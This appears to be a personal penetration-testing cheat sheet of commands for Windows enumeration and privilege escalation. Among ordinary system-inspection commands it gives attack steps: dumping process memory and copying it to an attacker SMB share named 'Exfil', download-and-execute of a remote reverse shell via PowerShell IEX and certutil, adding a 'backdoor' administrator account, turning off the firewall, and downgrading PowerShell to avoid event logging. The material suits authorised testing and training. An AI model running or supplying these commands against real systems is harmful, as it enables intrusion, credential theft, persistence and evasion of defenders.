# Windows Enumeration

## If the host is running a webapp

	Go look at the webapp dir to find configs and he code
	Go look at the database
	Look at the configs of the other apps running: ftp, mails, etc
	Search users home with:
		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg
		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg | select-string password

	Use Snaffler to try to find credentials:
		https://github.com/Andre92Marcos/tools/tree/master/snaffler

## Basic System Information

	echo %USERNAME%		Print current user
	whoami /priv		Displays current user privileges
		https://github.com/Andre92Marcos/escalations/blob/master/ldap_attacks_enumeration.md#acl
		Interesting Privileges:
			SeDebugPrivilege
			SeTakeOwnership
			SeBackupPrivilege
				https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
			SeLoadDriverPrivilege
			Se Impersonate and SeAssignPrimaryToken
				https://github.com/ohpe/juicy-potato
	whoami /groups		Displays current user groups
		Interesting Groups:
			Backup Operators
			Event Log Readers
			DnsAdmins
			Server Operators
	whoami /all
	hostname		Prints the PC's Name
	[System.Environment]::OSVersion.Version		Prints out the OS version and revision level
	echo %PROCESSOR_ARCHITECTURE%
	echo %USERDOMAIN%		Displays the domain name to which the host belongs
	echo %logonserver%		Prints out the name of the Domain controller the host checks in with
	net accounts	Print passworwd policy
	net user		Print all users
	net localgroup		Print all groups
	net localgroup administrators
	net localgroup <groupname>		Prints information of group
	net share 	Check current shares
	tasklist /svc		Gives a better idea of what applications are running on the system. Prints the name of executables and services running
		https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist

	set		Prints env variables including PATH
	
	wmic product get name		Get installed programs
		or using powershell
		Get-WmiObject -Class Win32_Product |  select Name, Version

	netstat -ano		Display active tcp and udp connections
	query user		Display active users
	net accounts		Prints password policy
	qwinsta		Shows active sessions in host

	get-process		Enumerates running processes
	wmic process list /format:list	 	A listing of all processes on host

		Use procdump https://learn.microsoft.com/en-us/sysinternals/downloads/procdump , to dump the memory of any interesting running process

			.\procdump.exe -ma <process_id> <output_file>
		
		We can use an smb share to download the output_file in cmd:

			on our local machine we do

			smbserver.py -smb2support -username guest -password guest share <path_to_folder_we_gonna_share>

			smbserver is a script from impacket

			on the remote machine we do

			net use x: \\<our_local_ip>\share /user:guest guest #

			and now we copy the dump file

			cmd /c "copy <filen_name>.dmp X:\"

		We can do the same in powershell:

			impacket-smbserver.py -smb2support share <path_to_folder_we_want_to_share>

			in powershell

			New-PSDrive -Name Exfil -PSProvider -FileSystem -Root "\\10.10.14.8\share"

			then copy the file
			
			copy users.db exfil:

Get process information by pid:

	Get-WmiObject Win32_Process -Filter "ProcessId = <PID>"
	Get-Process -Id <PID>

	cmdkey /list	Lists stored credentials

## Gather Network Information

	ipconfig /all	Prints out network adapter state and configurations
	arp -a
	route print
	ipconfig /displaydns


## Powershell Enumeration

	Get-Module 		Lists available modules loaded for use.
	Get-ExecutionPolicy -List		Will print the execution policy settings for each scope on a host.
	Set-ExecutionPolicy Bypass -Scope Process	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.

	Get-ChildItem Env: | ft Key,Value		Return environment values such as key paths, users, computer information, etc.
	Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt		With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords

### Downgrading Powershell

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

	powershell.exe -version 2
	Get-host


## Enumerate Protections

	https://github.com/Andre92Marcos/escalations/blob/master/ldap_security_enumeration.md

	sc query windefend		Checks if Windows Defender is running
	netsh advfirewall show allprofiles		Checks Windows Firewall settings


## System info

Check if Windows version has any known vulnerability (also check the patches applied)

		https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix
		systeminfo #Prints information of the system, including hotfixes applied
		systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information

		If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.

		wmic qfe get Caption,Description,HotFixID,InstalledOn		Prints the patch level and description of the Hotfixes applied 
		wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture

		[System.Environment]::OSVersion.Version #Current OS version
		Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
		Get-HotFix | ft -AutoSize
		Get-Hotfix -description "Security update" #List only "Security Update" patches


## Search for passwords

	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s

## Check communication through processess using pipes

	pipelist.exe /accepteula		enumerate instances of named pipes
		https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist
	Get-ChildItem \\.\pipe\		enumerate instances of named pipes with powershell
	accesschk.exe /accepteula \\.\Pipe\<name_of_pipe> -v		Enumerate permissions of pipe. We are looking for a pipe we have WRITE permissions for our user
		https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
	accesschk.exe -w \pipe\* -v		Enumerates all pipes that have WRITE permission
	Use powersploit powerup to check miss configurations
		https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
		IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp.ps1")
		Then run is ps:
		Invoke-AllChecks


## Check weak permission

	Use the sharpup too to check service binaries suffering from weak ACLS

		SharpUP.exe audit
			https://github.com/GhostPack/SharpUp/
	Check permissions using icacls
		https://ss64.com/nt/icacls.html



## Remote Login with username and password

We can try doing remote logins with useranmes and passwords using a script from impacket

	psexec.py '<username>:<password>@<remote_host_ip>'

Use impacket-wmiexec with rpc port 135:

	https://github.com/Andre92Marcos/tools/blob/master/impacket/wmiexec.md


## Try WinPeas

	https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS


## Other Info

Download and execute file using powershell:

	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'

Download file:

	certutil.exe -urlcache -f http://<localhostip>/rev_shell <path_to_where_file_is_gonna_be_saved>

Good dir to save, download and write files:

	C:\Users\Public\

Add backdoor account as admin user:

	net user /add backdoor Password1
	net localgroup administrators /add backdoor

	Confirm that it has been added: net locagroup administrators

	This user can winrm, if it is enabled

Disable firewall:

	netsh advfirewall set allprofiles state off

When saving text files on windows and then processing them on linux, remember that windows saved the text files with utl-16le, therefore grep want find the strings we are looking for. Instead we can use ripgrep:

	cat windows_text_file.txt |rg "string_to_find"

or we can convert the text file to utf-8

	cat windows_text_file.txt | iconv -f utf-16le -t utf-8 | grep "string_to_find"


## Payloads

Use https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_exe.c to generate a reverse shell exe:

	x86_64-w64-mingw32-gcc rev_shell_exe.c -o rev_shell.exe

## More info

	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
